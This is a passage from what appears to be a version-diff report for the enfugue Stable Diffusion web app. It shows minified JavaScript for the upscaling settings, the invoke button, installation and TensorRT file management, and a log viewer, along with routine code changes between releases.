Maintain sharp pixel boundaries, resulting in a pixelated or retro look."}class UpscaleDiffusionIterativeControlnetInputView extends RepeatableInputView{static maximumItems=5;static minimumItems=0;static memberClass=UpscaleDiffusionControlnetInputView;static tooltip="The controlnet to use during upscaling. None are required, and using one will result in significant slowdowns during upscaling, but can result in a more consistent upscaled image. When using multiple methods, the first is used for the first upscale, the second is used for the second (when using iterative upscaling), etc.<br /><strong>Tile</strong>: This network is trained on large images and slices of their images.<br /><strong>Canny Edge</strong>: This network is trained on images and the edges of that image after having run through Canny Edge detection. The output image will be processed with this algorithm.<br /><strong>HED</strong>: Short for Holistically-Nested Edge Detection, this edge-detection algorithm is best used when the input image is too blurry or too noisy for Canny Edge detection.<br /><strong>MLSD</strong>: Short for Mobile Line Segment Detection, this edge-detection algorithm searches only for straight lines, and is best used for geometric or architectural images."}class UpscaleDiffusionPromptInputView extends RepeatableInputView{static maximumItems=5;static memberClass=TextInputView;static tooltip="The prompt to use when upscaling, it is generally best to use generic detail-oriented prompts, unless there are specific things or people you want to ensure have details.<br />When using multiple prompts, the first is used for the first upscale, the second is used for the second (when using iterative upscaling), etc."}class UpscaleDiffusionNegativePromptInputView extends UpscaleDiffusionPromptInputView{static tooltip="The negative prompt to use when upscaling, it is generally best to use generic negative prompts, unless there are specific things you don't want.<br />When using multiple prompts, the first is used for the first upscale, the second is used for the second (when using iterative upscaling), etc."}class UpscaleDiffusionStrengthInputView extends RepeatableInputView{static memberClass=FloatInputView;static memberConfig={min:0,value:.2,max:1,step:.01};static minimumItems=1;static maximumItems=5;static tooltip="The amount to change the image when upscaling, from 0 to 1. Keep this low to improve consistency in the upscaled image, or increase it to add many details for a tableau or panorama style.<br />When using multiple strengths, the first is used for the first upscale, the second is used for the second (when using iterative upscaling), etc."}class UpscaleDiffusionStepsInputView extends RepeatableInputView{static memberClass=NumberInputView;static memberConfig={min:0,max:1e3,value:100};static minimumItems=1;static maximumItems=5;static tooltip="The number of inference steps to make during the denoising loop of the upscaled image. Higher values can result in more details but can also take significantly longer, especially with high denoising strengths.<br />When using multiple step amounts, the first is used for the first upscale, the second is used for the second (when using iterative upscaling), etc."}class UpscaleDiffusionGuidanceScaleInputView extends RepeatableInputView{static memberClass=FloatInputView;static memberConfig={min:0,max:100,value:12,step:.1};static minimumItems=1;static maximumItems=5;static tooltip="The amount to adhere to the prompts during upscaling. Higher values can result in more details but less consistency.<br />When using multiple guidance scales, the first is used for the first upscale, the second is used for the second (when using iterative upscaling), etc."}class UpscaleForm extends FormView{static autoSubmit=!0;static collapseFieldSets=!0;static fieldSets={Upscaling:{outscale:{label:"Output Scale",class:OutputScaleInputView}},"Upscale Methods":{upscale:{label:"Upscale Methods",class:UpscaleMethodsInputView},upscaleIterative:{label:"Use Iterative Upscaling",class:CheckboxInputView,config:{tooltip:"Instead of directly upscaling to the target amount, double in size repeatedly until the image reaches the target size. For example, when this is checked and the upscale amount is 4×, there will be two upscale steps, 8× will be three, and 16× will be four."}},upscaleDiffusion:{label:"Diffuse Upscaled Samples",class:CheckboxInputView,config:{tooltip:"After upscaling the image use the the algorithm chosen above, use the image as input to another invocation of Stable Diffusion."}}},"Upscale Diffusion":{upscaleDiffusionControlnet:{label:"ControlNet",class:UpscaleDiffusionIterativeControlnetInputView},upscaleDiffusionPrompt:{label:"Detail Prompt",class:UpscaleDiffusionPromptInputView},upscaleDiffusionNegativePrompt:{label:"Detail Negative Prompt",class:UpscaleDiffusionNegativePromptInputView},upscaleDiffusionSteps:{label:"Inference Steps",class:UpscaleDiffusionStepsInputView},upscaleDiffusionStrength:{label:"Denoising Strength",class:UpscaleDiffusionStrengthInputView},upscaleDiffusionGuidanceScale:{label:"Guidance Scale",class:UpscaleDiffusionGuidanceScaleInputView},upscaleDiffusionChunkingSize:{label:"Chunk Size",class:NumberInputView,config:{minimum:32,maximum:512,step:8,value:64,tooltip:"The number of pixels to move the frame by during diffusion. Smaller values produce better results, but take longer."}},upscaleDiffusionChunkingBlur:{label:"Chunk Blur",class:NumberInputView,config:{minimum:32,maximum:512,step:8,value:64,tooltip:"The number of pixels to feather the edges of the frame by during diffusion. Smaller values result in more pronounced lines, and large values result in a smoother overall image."}},upscaleDiffusionScaleChunkingSize:{label:"Scale Chunk Size with Iteration",class:CheckboxInputView,config:{value:!0,tooltip:"Scale the chunking size ×2 with each iteration of upscaling, with a maximum size of ½ the size of the model."}},upscaleDiffusionScaleChunkingBlur:{label:"Scale Chunk Blur with Iteration",class:CheckboxInputView,config:{value:!0,tooltip:"Scale the chunking blur ×2 with each iteration of upscaling, with a maximum size of ½ the size of the model."}}}};static fieldSetConditions={"Upscale Methods":e=>parseInt(e.outscale)>1,"Upscale Diffusion":e=>parseInt(e.outscale)>1&&e.upscaleDiffusion}}class UpscaleController extends Controller{getState(){return{upscale:this.upscaleForm.values}}getDefaultState(){return{upscale:{outscale:1,upscale:["esrgan"],upscaleIterative:!1,upscaleDiffusion:!1,upscaleDiffusionSteps:[100],upscaleDiffusionStrength:[.2],upscaleDiffusionGuidanceScale:[12],upscaleDiffusionChunkingSize:64,upscaleDiffusionScaleChunkingSize:!0,upscaleDiffusionScaleChunkingBlur:!0}}}setState(e){if(!isEmpty(e.upscale)){let t=deepClone(e.upscale);isEmpty(t.upscaleDiffusionControlnet)&&(t.upscaleDiffusionControlnet=[]),isEmpty(t.upscaleDiffusionPrompt)&&(t.upscaleDiffusionPrompt=[]),isEmpty(t.upscaleDiffusionNegativePrompt)&&(t.upscaleDiffusionNegativePrompt=[]),this.upscaleForm.setValues(t).then((()=>this.upscaleForm.submit()))}}async initialize(){this.upscaleForm=new UpscaleForm(this.config),this.upscaleForm.onSubmit((async e=>{this.engine.upscale=e.upscale,this.engine.outscale=e.outscale,this.engine.upscaleIterative=e.upscaleIterative,this.engine.upscaleMethod=e.upscaleMethod,this.engine.upscaleDiffusion=e.upscaleDiffusion,this.engine.upscaleDiffusionControlnet=e.upscaleDiffusionControlnet,this.engine.upscaleDiffusionSteps=e.upscaleDiffusionSteps,this.engine.upscaleDiffusionStrength=e.upscaleDiffusionStrength,this.engine.upscaleDiffusionGuidanceScale=e.upscaleDiffusionGuidanceScale,this.engine.upscaleDiffusionChunkingSize=e.upscaleDiffusionChunkingSize,this.engine.upscaleDiffusionChunkingBlur=e.upscaleDiffusionChunkingBlur,this.engine.upscaleDiffusionScaleChunkingSize=e.upscaleDiffusionScaleChunkingSize,this.engine.upscaleDiffusionScaleChunkingBlur=e.upscaleDiffusionScaleChunkingBlur,this.engine.upscaleDiffusionPrompt=e.upscaleDiffusionPrompt,this.engine.upscaleDiffusionNegativePrompt=e.upscaleDiffusionNegativePrompt})),this.application.sidebar.addChild(this.upscaleForm)}}export{UpscaleController as SidebarController};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/sidebar/05-prompts.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/sidebar/07-prompts.mjs`

 * *Files identical despite different names*

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/sidebar/99-invoke.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/sidebar/99-invoke.mjs`

 * *Files 12% similar despite different names*

```diff
@@ -1 +1 @@
-import{isEmpty}from"../../base/helpers.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{ButtonInputView}from"../../view/forms/input.mjs";import{Controller}from"../base.mjs";import{View}from"../../view/base.mjs";const E=new ElementBuilder;class InvokeLoadingBarView extends View{static className="invoke-loader";static loaderClassName="loading-bar"}class EnfugueButton extends ButtonInputView{static className="invoke";static defaultValue="ENFUGUE"}class InvokeButtonController extends Controller{getNodes(){return this.images.getState().map((e=>{let t={x:e.x,y:e.y,w:e.w,h:e.h};switch(e.classname){case"ImageEditorPromptNodeView":t.type="prompt",t.infer=!0,t.prompt=e.prompt,t.negative_prompt=e.negativePrompt,t.guidance_scale=e.guidanceScale,t.inference_steps=e.inferenceSteps,t.remove_background=e.removeBackground;break;case"ImageEditorScribbleNodeView":t.type="scribble",t.image=e.src,t.control=!0,t.controlnet="scribble",t.prompt=e.prompt,t.negative_prompt=e.negativePrompt,t.guidance_scale=e.guidanceScale,t.inference_steps=e.inferenceSteps,t.remove_background=e.removeBackground;break;case"ImageEditorImageNodeView":t.type="image",t.fit=e.fit,t.anchor=e.anchor,t.infer=e.infer,t.control=e.control,t.inpaint=e.inpaint,t.image=e.src,t.mask=e.scribbleSrc,t.strength=e.strength,t.conditioning_scale=e.conditioningScale,t.controlnet=e.controlnet,t.prompt=e.prompt,t.negative_prompt=e.negativePrompt,t.guidance_scale=e.guidanceScale,t.inference_steps=e.inferenceSteps,t.remove_background=e.removeBackground,t.process_control_image=e.processControlImage;break;default:throw`Unknown classname ${e.classname}`}return t}))}async tryInvoke(){this.loadingBar.loading(),this.invokeButton.disable().addClass("sliding-gradient");try{this.application.autosave(),await this.engine.invoke({nodes:this.getNodes()})}catch(e){console.error(e);let t=`${e}`;if(isEmpty(e.detail)?isEmpty(e.title)||(t=e.title):t=e.detail,-1!==t.toLowerCase().indexOf("engine process died"))return this.notify("warn","Engine Didn't Start","The diffusion engine process exited before it started responding to requests. Waiting a moment and trying again."),await this.tryInvoke();this.notify("error","Couldn't Start",t)}this.invokeButton.enable().removeClass("sliding-gradient"),this.loadingBar.doneLoading()}async initialize(){this.invokeButton=new EnfugueButton(this.config),this.invokeButton.onChange((()=>this.tryInvoke())),this.loadingBar=new InvokeLoadingBarView,await this.application.sidebar.addChild(this.invokeButton),await this.application.sidebar.addChild(this.loadingBar)}}export{InvokeButtonController as SidebarController};
+import{isEmpty}from"../../base/helpers.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{ButtonInputView}from"../../view/forms/input.mjs";import{Controller}from"../base.mjs";import{View}from"../../view/base.mjs";const E=new ElementBuilder;class InvokeLoadingBarView extends View{static className="invoke-loader";static loaderClassName="loading-bar"}class EnfugueButton extends ButtonInputView{static className="invoke";static defaultValue="ENFUGUE"}class InvokeButtonController extends Controller{getNodes(){return this.images.getState().map((e=>{let t={x:e.x,y:e.y,w:e.w,h:e.h,prompt:e.prompt,negative_prompt:e.negativePrompt,inference_steps:e.inferenceSteps,guidance_scale:e.guidanceScale,scale_to_model_size:e.scaleToModelSize,remove_background:e.removeBackground};switch(e.classname){case"ImageEditorPromptNodeView":t.type="prompt",t.infer=!0;break;case"ImageEditorScribbleNodeView":t.type="scribble",t.image=e.src,t.control=!0,t.controlnet="scribble",t.invert=!0,t.process_control_image=!1;break;case"ImageEditorImageNodeView":t.type="image",t.fit=e.fit,t.anchor=e.anchor,t.infer=e.infer,t.control=e.control,t.inpaint=e.inpaint,t.image=e.src,t.mask=e.inpaint?e.scribbleSrc:null,t.strength=e.strength,t.conditioning_scale=e.conditioningScale,t.controlnet=e.controlnet,t.invert="invert"==e.colorSpace,t.invert_mask=!0,t.process_control_image=e.processControlImage;break;default:throw`Unknown classname ${e.classname}`}return t}))}async tryInvoke(){this.loadingBar.loading(),this.invokeButton.disable().addClass("sliding-gradient");try{this.application.autosave(),await this.engine.invoke({nodes:this.getNodes()})}catch(e){console.error(e);let t=`${e}`;if(isEmpty(e.detail)?isEmpty(e.title)||(t=e.title):t=e.detail,-1!==t.toLowerCase().indexOf("engine process died"))return this.notify("warn","Engine Didn't Start","The diffusion engine process exited before it started responding to requests. Waiting a moment and trying again."),await this.tryInvoke();this.notify("error","Couldn't Start",t)}this.invokeButton.enable().removeClass("sliding-gradient"),this.loadingBar.doneLoading()}async initialize(){this.invokeButton=new EnfugueButton(this.config),this.invokeButton.onChange((()=>this.tryInvoke())),this.loadingBar=new InvokeLoadingBarView,await this.application.sidebar.addChild(this.invokeButton),await this.application.sidebar.addChild(this.loadingBar)}}export{InvokeButtonController as SidebarController};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/system/03-installation.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/system/03-installation.mjs`

 * *Files 0% similar despite different names*

```diff
@@ -1 +1 @@
-import{MenuController}from"../menu.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{isEmpty,humanSize}from"../../base/helpers.mjs";import{View,ParentView}from"../../view/base.mjs";import{FormView}from"../../view/forms/base.mjs";import{TableView}from"../../view/table.mjs";import{FileInputView,ButtonInputView,StringInputView}from"../../view/forms/input.mjs";const E=new ElementBuilder;class ChangeDirectoryForm extends FormView{static showCancel=!0;static fieldSets={Directory:{directory:{class:StringInputView,config:{required:!0,placeholder:"C:\\Users\\MyUser\\..."}}}}}class UploadFileFormView extends FormView{static showCancel=!0;static fieldSets={File:{file:{class:FileInputView,config:{required:!0}}}}}class UploadFileButtonInputView extends ButtonInputView{static className="upload-file-input-view";static defaultValue="Upload File"}class InstallationDirectorySummaryTableView extends TableView{static className="installation-directory-summary-table-view";static columns={location:"Location",directory:"Directory",items:"Items",bytes:"Total File Size"};static columnFormatters={bytes:t=>humanSize(t)}}class InstallationDirectoryTableView extends TableView{static className="installation-directory-table-view";static columns={name:"Name",bytes:"Total File Size"};static columnFormatters={bytes:t=>humanSize(t)}}class TensorRTEngineTableView extends TableView{static columns={model:"Model",type:"Type",size:"Size",lora:"LoRA",inversion:"Inversions",bytes:"File Size",used_by:"Used By"};static columnFormatters={type:(t,e)=>{let i="";return e.model.endsWith("-inpainting")&&(i="Inpainting "),`${i}${{unet:"UNet",controlledunet:"Controlled UNet",clip:"CLIP",vae:"VAE",controlnet:"ControlNet"}[t]}`},size:t=>`${t}px`,bytes:t=>humanSize(t),lora:t=>isEmpty(t)?"None":t.map((t=>t.join(":"))).join("<br />"),inversion:t=>isEmpty(t)?"None":t.map((t=>t.model)).join("<br />"),used_by:t=>isEmpty(t)?"None":t.length<=2?t.join("<br />"):t.slice(0,2).join("<br />")+`<br />…and ${t.length-2} more`}}class TensorRTEngineSummaryTableView extends TableView{static columns={total:"Total Engines",used:"Currently Used",bytes:"Total File Size"};static columnFormatters={total:t=>isEmpty(t)?"None":`${t}`,used:t=>isEmpty(t)?"None":`${t}`,bytes:t=>isEmpty(t)?"0 Bytes":humanSize(t)}}class InstallationSummaryView extends View{constructor(t){super(t.config),this.controller=t,this.summaryTable=new InstallationDirectorySummaryTableView(this.config),this.summaryTable.addButton("Manage","fa-solid fa-list-check",(t=>{this.controller.showDirectoryManager(t.directory)})),this.summaryTable.addButton("Change Directory","fa-solid fa-edit",(t=>{this.controller.showChangeDirectory(t.directory,t.location)})),this.engineTable=new TensorRTEngineSummaryTableView(this.config),this.engineTable.addButton("Manage","fa-solid fa-list-check",(()=>{this.controller.showTensorRTManager()}))}async update(){let t=await this.controller.model.get("/installation"),e=await this.controller.model.get("/tensorrt");await this.summaryTable.setData(Object.getOwnPropertyNames(t).map((e=>(console.log(e),{directory:e,location:t[e].path,items:t[e].items,bytes:t[e].bytes}))),!1),await this.engineTable.setData([e.reduce(((t,e)=>(void 0===t.total&&(t.total=0),void 0===t.used&&(t.used=0),void 0===t.bytes&&(t.bytes=0),t.total+=1,t.used+=e.used,t.bytes+=e.bytes,t)),{})],!1)}async build(){let t=await super.build();return await this.update(),t.content(E.h2().content("Weights and Configuration"),await this.summaryTable.getNode(),E.h2().content("TensorRT Engines"),await this.engineTable.getNode())}}class InstallationController extends MenuController{static menuName="Installation";static menuIcon="fa-solid fa-folder-tree";static summaryWindowWidth=600;static summaryWindowHeight=600;static managerWindowWidth=600;static managerWindowHeight=800;static uploadWindowWidth=400;static uploadWindowHeight=250;static changeDirectoryWindowWidth=400;static changeDirectoryWindowHeight=200;static uploadableDirectories=["lora","checkpoint","inversion"];async initialize(){await super.initialize(),this.directoryWindows={}}async showSummaryWindow(){isEmpty(this.summaryWindow)?(this.summaryWindow=await this.spawnWindow("Installation Summary",await this.getSummaryView(),this.constructor.summaryWindowWidth,this.constructor.summaryWindowHeight),this.summaryWindow.onClose((()=>{this.summaryWindow=null}))):this.summaryWindow.focus()}async getSummaryView(){return isEmpty(this.summaryView)?this.summaryView=new InstallationSummaryView(this):this.summaryView.update(),this.summaryView}async showTensorRTManager(){let t=await this.model.get("/tensorrt");if(isEmpty(this.tensorRTManagerWindow)){let e=new TensorRTEngineTableView(this.config,t);e.addButton("Delete","fa-solid fa-trash",(async t=>{let i=`/tensorrt/${t.model}/${t.type}/${t.key}`;try{await this.model.delete(i),this.notify("info","Success","TensorRT engine deleted."),e.setData(await this.model.get("/tensorrt"),!1),isEmpty(this.summaryView)||this.summaryView.update()}catch(t){let e=`${t}`;isEmpty(t.detail)?isEmpty(t.title)||(e=t.title):e=t.detail,this.notify("error","Couldn't Delete",e)}})),this.tensorRTManagerWindow=await this.spawnWindow("TensorRT Engines",e,this.constructor.managerWindowWidth,this.constructor.managerWindowHeight),this.tensorRTManagerWindow.onClose((()=>{this.tensorRTManagerWindow=null}))}else this.tensorRTManagerWindow.content.setData(t,!1),this.tensorRTManagerWindow.focus()}async showUploadFile(t){let e=new UploadFileFormView(this.config),i=await this.spawnWindow(`Upload File to '${t}'`,e,this.constructor.uploadWindowWidth,this.constructor.uploadWindowHeight);e.onSubmit((async s=>{await this.model.multiPart(`/installation/${t}`,null,null,{file:s.file},(async t=>{(await e.getInputView("file")).setProgress(t.loaded/t.total)})),this.notify("info","Uploaded",`File successfully uploaded to '${t}'`),isEmpty(this.summaryView)||this.summaryView.update(),isEmpty(this.directoryWindows[t])||this.directoryWindows[t].content.getChild(0).setData(await this.model.get(`/installation/${t}`),!1),i.remove()})),e.onCancel((()=>{i.remove()}))}async showChangeDirectory(t,e){let i=new ChangeDirectoryForm(this.config,{directory:e}),s=await this.spawnWindow(`Change Filesystem Location for ${t}`,i,this.constructor.changeDirectoryWindowWidth,this.constructor.changeDirectoryWindowHeight);i.onSubmit((async e=>{try{await this.model.post(`/installation/${t}/move`,null,null,{directory:e.directory}),this.notify("info","Changed",`Filesystem Location successfully changed for ${t}`),isEmpty(this.summaryView)||this.summaryView.update(),isEmpty(this.directoryWindows[t])||this.directoryWindows[t].content.getChild(0).setData(await this.model.get(`/installation/${t}`),!1),s.remove()}catch(t){let e=`${t}`;isEmpty(t.detail)?isEmpty(t.title)||(e=t.title):e=t.detail,this.notify("error","Couldn't Change",e),i.enable()}})),i.onCancel((()=>{s.remove()}))}async showDirectoryManager(t){let e=await this.model.get(`/installation/${t}`);if(isEmpty(this.directoryWindows[t])){let i=new InstallationDirectoryTableView(this.config,e);i.addButton("Delete","fa-solid fa-trash",(async e=>{let s=`/installation/${t}/${e.name}`;try{await this.model.delete(s),this.notify("info","Success",`Successfully deleted <strong>${t}/${e.name}</strong>`),i.setData(await this.model.get(`/installation/${t}`),!1),isEmpty(this.summaryView)||this.summaryView.update()}catch(t){let e=`${t}`;isEmpty(t.detail)?isEmpty(t.title)||(e=t.title):e=t.detail,this.notify("error","Couldn't Delete",e)}}));let s=new ParentView(this.config);if(s.addClass("installation-summary-view"),s.addChild(i),-1!==this.constructor.uploadableDirectories.indexOf(t)){let e=new UploadFileButtonInputView(this.config);e.onChange((()=>{this.showUploadFile(t)})),s.addChild(e)}this.directoryWindows[t]=await this.spawnWindow(`Manage Directory '${t}'`,s,this.constructor.managerWindowWidth,this.constructor.managerWindowHeight),this.directoryWindows[t].onClose((()=>{this.directoryWindows[t]=null}))}else this.directoryWindows[t].content.getChild(0).setData(e),this.directoryWindows[t].focus()}async onClick(){this.showSummaryWindow()}}export{InstallationController as MenuController};
+import{MenuController}from"../menu.mjs";import{ElementBuilder}from"../../base/builder.mjs";import{isEmpty,humanSize}from"../../base/helpers.mjs";import{View,ParentView}from"../../view/base.mjs";import{FormView}from"../../view/forms/base.mjs";import{TableView}from"../../view/table.mjs";import{FileInputView,ButtonInputView,StringInputView}from"../../view/forms/input.mjs";const E=new ElementBuilder;class ChangeDirectoryForm extends FormView{static showCancel=!0;static fieldSets={Directory:{directory:{class:StringInputView,config:{required:!0,placeholder:"C:\\Users\\MyUser\\..."}}}}}class UploadFileFormView extends FormView{static showCancel=!0;static fieldSets={File:{file:{class:FileInputView,config:{required:!0}}}}}class UploadFileButtonInputView extends ButtonInputView{static className="upload-file-input-view";static defaultValue="Upload File"}class InstallationDirectorySummaryTableView extends TableView{static className="installation-directory-summary-table-view";static columns={location:"Location",directory:"Directory",items:"Items",bytes:"Total File Size"};static columnFormatters={bytes:t=>humanSize(t)}}class InstallationDirectoryTableView extends TableView{static className="installation-directory-table-view";static columns={name:"Name",bytes:"Total File Size"};static columnFormatters={bytes:t=>humanSize(t)}}class TensorRTEngineTableView extends TableView{static columns={model:"Model",type:"Type",size:"Size",lora:"LoRA",inversion:"Inversions",bytes:"File Size",used_by:"Used By"};static columnFormatters={type:(t,e)=>{let i="";return e.model.endsWith("-inpainting")&&(i="Inpainting "),`${i}${{unet:"UNet",controlledunet:"Controlled UNet",clip:"CLIP",vae:"VAE",controlnet:"ControlNet"}[t]}`},size:t=>`${t}px`,bytes:t=>humanSize(t),lora:t=>isEmpty(t)?"None":t.map((t=>t.join(":"))).join("<br />"),inversion:t=>isEmpty(t)?"None":t.map((t=>t.model)).join("<br />"),used_by:t=>isEmpty(t)?"None":t.length<=2?t.join("<br />"):t.slice(0,2).join("<br />")+`<br />…and ${t.length-2} more`}}class TensorRTEngineSummaryTableView extends TableView{static columns={total:"Total Engines",used:"Currently Used",bytes:"Total File Size"};static columnFormatters={total:t=>isEmpty(t)?"None":`${t}`,used:t=>isEmpty(t)?"None":`${t}`,bytes:t=>isEmpty(t)?"0 Bytes":humanSize(t)}}class InstallationSummaryView extends View{constructor(t){super(t.config),this.controller=t,this.summaryTable=new InstallationDirectorySummaryTableView(this.config),this.summaryTable.addButton("Manage","fa-solid fa-list-check",(t=>{this.controller.showDirectoryManager(t.directory)})),this.summaryTable.addButton("Change Directory","fa-solid fa-edit",(t=>{this.controller.showChangeDirectory(t.directory,t.location)})),this.engineTable=new TensorRTEngineSummaryTableView(this.config),this.engineTable.addButton("Manage","fa-solid fa-list-check",(()=>{this.controller.showTensorRTManager()}))}async update(){let t=await this.controller.model.get("/installation"),e=await this.controller.model.get("/tensorrt");await this.summaryTable.setData(Object.getOwnPropertyNames(t).map((e=>({directory:e,location:t[e].path,items:t[e].items,bytes:t[e].bytes}))),!1),await this.engineTable.setData([e.reduce(((t,e)=>(void 0===t.total&&(t.total=0),void 0===t.used&&(t.used=0),void 0===t.bytes&&(t.bytes=0),t.total+=1,t.used+=e.used,t.bytes+=e.bytes,t)),{})],!1)}async build(){let t=await super.build();return await this.update(),t.content(E.h2().content("Weights and Configuration"),await this.summaryTable.getNode(),E.h2().content("TensorRT Engines"),await this.engineTable.getNode())}}class InstallationController extends MenuController{static menuName="Installation";static menuIcon="fa-solid fa-folder-tree";static summaryWindowWidth=600;static summaryWindowHeight=600;static managerWindowWidth=600;static managerWindowHeight=800;static uploadWindowWidth=400;static uploadWindowHeight=250;static changeDirectoryWindowWidth=400;static changeDirectoryWindowHeight=200;static uploadableDirectories=["lora","checkpoint","inversion"];async initialize(){await super.initialize(),this.directoryWindows={}}async showSummaryWindow(){isEmpty(this.summaryWindow)?(this.summaryWindow=await this.spawnWindow("Installation Summary",await this.getSummaryView(),this.constructor.summaryWindowWidth,this.constructor.summaryWindowHeight),this.summaryWindow.onClose((()=>{this.summaryWindow=null}))):this.summaryWindow.focus()}async getSummaryView(){return isEmpty(this.summaryView)?this.summaryView=new InstallationSummaryView(this):this.summaryView.update(),this.summaryView}async showTensorRTManager(){let t=await this.model.get("/tensorrt");if(isEmpty(this.tensorRTManagerWindow)){let e=new TensorRTEngineTableView(this.config,t);e.addButton("Delete","fa-solid fa-trash",(async t=>{let i=`/tensorrt/${t.model}/${t.type}/${t.key}`;try{await this.model.delete(i),this.notify("info","Success","TensorRT engine deleted."),e.setData(await this.model.get("/tensorrt"),!1),isEmpty(this.summaryView)||this.summaryView.update()}catch(t){let e=`${t}`;isEmpty(t.detail)?isEmpty(t.title)||(e=t.title):e=t.detail,this.notify("error","Couldn't Delete",e)}})),this.tensorRTManagerWindow=await this.spawnWindow("TensorRT Engines",e,this.constructor.managerWindowWidth,this.constructor.managerWindowHeight),this.tensorRTManagerWindow.onClose((()=>{this.tensorRTManagerWindow=null}))}else this.tensorRTManagerWindow.content.setData(t,!1),this.tensorRTManagerWindow.focus()}async showUploadFile(t){let e=new UploadFileFormView(this.config),i=await this.spawnWindow(`Upload File to '${t}'`,e,this.constructor.uploadWindowWidth,this.constructor.uploadWindowHeight);e.onSubmit((async s=>{await this.model.multiPart(`/installation/${t}`,null,null,{file:s.file},(async t=>{(await e.getInputView("file")).setProgress(t.loaded/t.total)})),this.notify("info","Uploaded",`File successfully uploaded to '${t}'`),isEmpty(this.summaryView)||this.summaryView.update(),isEmpty(this.directoryWindows[t])||this.directoryWindows[t].content.getChild(0).setData(await this.model.get(`/installation/${t}`),!1),i.remove()})),e.onCancel((()=>{i.remove()}))}async showChangeDirectory(t,e){let i=new ChangeDirectoryForm(this.config,{directory:e}),s=await this.spawnWindow(`Change Filesystem Location for ${t}`,i,this.constructor.changeDirectoryWindowWidth,this.constructor.changeDirectoryWindowHeight);i.onSubmit((async e=>{try{await this.model.post(`/installation/${t}/move`,null,null,{directory:e.directory}),this.notify("info","Changed",`Filesystem Location successfully changed for ${t}`),isEmpty(this.summaryView)||this.summaryView.update(),isEmpty(this.directoryWindows[t])||this.directoryWindows[t].content.getChild(0).setData(await this.model.get(`/installation/${t}`),!1),s.remove()}catch(t){let e=`${t}`;isEmpty(t.detail)?isEmpty(t.title)||(e=t.title):e=t.detail,this.notify("error","Couldn't Change",e),i.enable()}})),i.onCancel((()=>{s.remove()}))}async showDirectoryManager(t){let e=await this.model.get(`/installation/${t}`);if(isEmpty(this.directoryWindows[t])){let i=new InstallationDirectoryTableView(this.config,e);i.addButton("Delete","fa-solid fa-trash",(async e=>{let s=`/installation/${t}/${e.name}`;try{await this.model.delete(s),this.notify("info","Success",`Successfully deleted <strong>${t}/${e.name}</strong>`),i.setData(await this.model.get(`/installation/${t}`),!1),isEmpty(this.summaryView)||this.summaryView.update()}catch(t){let e=`${t}`;isEmpty(t.detail)?isEmpty(t.title)||(e=t.title):e=t.detail,this.notify("error","Couldn't Delete",e)}}));let s=new ParentView(this.config);if(s.addClass("installation-summary-view"),s.addChild(i),-1!==this.constructor.uploadableDirectories.indexOf(t)){let e=new UploadFileButtonInputView(this.config);e.onChange((()=>{this.showUploadFile(t)})),s.addChild(e)}this.directoryWindows[t]=await this.spawnWindow(`Manage Directory '${t}'`,s,this.constructor.managerWindowWidth,this.constructor.managerWindowHeight),this.directoryWindows[t].onClose((()=>{this.directoryWindows[t]=null}))}else this.directoryWindows[t].content.getChild(0).setData(e),this.directoryWindows[t].focus()}async onClick(){this.showSummaryWindow()}}export{InstallationController as MenuController};
```

### Comparing `enfugue-0.1.3/enfugue/static/js/controller/system/04-logs.mjs` & `enfugue-0.2.0/enfugue/static/js/controller/common/logs.mjs`

 * *Files 26% similar despite different names*

```diff
@@ -1 +1 @@
-import{isEmpty,deepClone}from"../../base/helpers.mjs";import{MenuController}from"../menu.mjs";import{FormView}from"../../view/forms/base.mjs";import{TableView}from"../../view/table.mjs";import{ParentView}from"../../view/base.mjs";import{StringInputView,ListMultiInputView}from"../../view/forms/input.mjs";class LogLevelSelectInputView extends ListMultiInputView{static defaultOptions=["DEBUG","INFO","WARN","ERROR","CRITICAL"]}class LogTableView extends TableView{static className="log-table-view";static canSort=!1;static applyDefaultSort=!1;static columns={timestamp:"Timestamp",logger:"Logger",level:"Level",content:"Content"}}class LogFilterFormView extends FormView{static autoSubmit=!0;static fieldSets={Filters:{level:{label:"Log Levels",class:LogLevelSelectInputView,config:{value:deepClone(LogLevelSelectInputView.defaultOptions)}},search:{label:"Search",class:StringInputView}}}}class SystemLogsController extends MenuController{static menuName="Engine Logs";static menuIcon="fa-solid fa-clipboard-list";static logsWindowWidth=600;static logsWindowHeight=700;static maximumLogs=100;static logTailInterval=5e3;async getLogs(){let t={};if(!isEmpty(this.lastLog)){let s=`${this.lastLog.getFullYear()}-${(this.lastLog.getMonth()+1).toString().padStart(2,"0")}-${this.lastLog.getDate().toString().padStart(2,"0")} ${this.lastLog.getHours().toString().padStart(2,"0")}:${this.lastLog.getMinutes().toString().padStart(2,"0")}:${this.lastLog.getSeconds().toString().padStart(2,"0")}`;t.since=s}isEmpty(this.levels)||(t.level=this.levels),isEmpty(this.search)||(t.search=this.search);let s=await this.model.get("/logs",null,t);return this.lastLog=new Date,isEmpty(this.logs)?this.logs=s:this.logs=s.concat(this.logs),this.logs=this.logs.slice(0,this.constructor.maximumLogs),this.logs}async getLogsView(){if(isEmpty(this.logsView)){let t=await this.getLogs();this.logsView=new ParentView(this.config),this.logsTable=await this.logsView.addChild(LogTableView,t)}return this.logsView}async startLogTailer(){this.timer=setInterval((async()=>{let t=await this.getLogs();isEmpty(this.logsView)||this.logsTable.setData(t,!1)}),this.constructor.logTailInterval)}async stopLogTailer(){clearInterval(this.timer),this.logTailer=null}async showLogTailer(){isEmpty(this.logTailer)?(this.logTailer=await this.spawnWindow("Engine Logs",await this.getLogsView(),this.constructor.logsWindowWidth,this.constructor.logsWindowHeight),this.startLogTailer(),this.logTailer.onClose((()=>{this.stopLogTailer()}))):this.logTailer.focus()}async onClick(){this.showLogTailer()}}export{SystemLogsController as MenuController};
